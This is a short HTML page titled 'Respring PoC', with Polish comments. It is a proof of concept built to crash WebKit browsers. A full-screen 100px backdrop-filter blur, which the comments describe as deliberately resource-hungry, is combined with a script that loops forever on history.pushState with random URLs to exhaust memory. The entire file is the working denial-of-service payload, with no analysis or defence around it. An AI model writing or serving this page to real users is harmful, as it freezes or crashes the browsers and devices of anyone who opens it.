<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring PoC</title>
    <style>
        /* Skrajnie zasobożerne style CSS zmuszające WebKit do awarii */
        html, body {
            margin: 0;
            padding: 0;
            background: #000;
        }
        div {
            backdrop-filter: blur(100px);
            -webkit-backdrop-filter: blur(100px);
            width: 100vw;
            height: 100vh;
        }
    </style>
</head>
<body>
    <div></div>
    <script>
        // Nieskończona pętla generująca potężne obciążenie pamięci (Memory Leak)
        while (true) {
            window.history.pushState(null, null, Math.random().toString());
        }
    </script>
</body>
</html>
